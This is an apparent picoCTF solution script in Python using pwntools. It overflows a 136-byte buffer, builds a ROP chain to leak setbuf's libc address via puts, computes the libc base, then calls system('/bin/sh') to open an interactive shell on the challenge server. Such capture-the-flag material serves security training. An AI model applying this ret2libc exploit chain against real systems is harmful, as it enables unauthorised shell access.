from pwn import *

# Challenge file libc.so.6
r = remote("mercury.picoctf.net", 49464)

pop_rdi = 0x400913
ret = 0x40052e

# Address of functions
"""
setbuf in GOT = 0x00601028 - puts in PLT = 0x00400540 - address of main func = 0x00400771
"""

setbuf_got = 0x601028
puts_plt = 0x400540
main_addr = 0x400771

# Write payload
payload = b"A" * 136
payload += p64(pop_rdi) # fill the ret address with the address of "pop rdi"
payload += p64(setbuf_got) # fill the rdi register with the address of setbuf() >
payload += p64(puts_plt) # calls puts() in PLT
payload += p64(main_addr) # run again the main function

r.sendline(payload)   # Send payload
print(r.recvline())  # Received line
print(r.recvline())
#receive_byte = u64(r.recvline().strip())
setbuf_found = u64(r.recvline().strip().ljust(8, b"\x00"))
log.info(f"We leaked the setbuf() address: {hex(setbuf_found)}")


setbuf_offset = 0x88540  # address of puts() in local/challen>
log.info(f"The address of setbuf() in libc.so.6: {hex(setbuf_offset)}")

libc_base = setbuf_found - setbuf_offset
log.info(f"Libc base address is: {hex(libc_base)}")

# Calculate the address of system() and string "/bin/sh" to exploit
system_offset = 0x4f4e0         # Address of system() in libc file
binsh_offset = 0x1b40fa		# Address of string "/bin/sh" in libc file
log.info(f"The address of system() in libc.so.6: {hex(system_offset)}")
log.info(f"The address of string /bin/sh in libc.so.6: {hex(binsh_offset)}")

system = libc_base + system_offset
binsh = libc_base + binsh_offset

# Create payload
payload = b'A'*136
payload += p64(ret)		# Align the stack before sending ROP Chain
payload += p64(pop_rdi)		# Set the argument
payload += p64(binsh)		# First argument of system()
payload += p64(system)		# call system()

# Exploit the target
r.sendline(payload)
r.interactive()
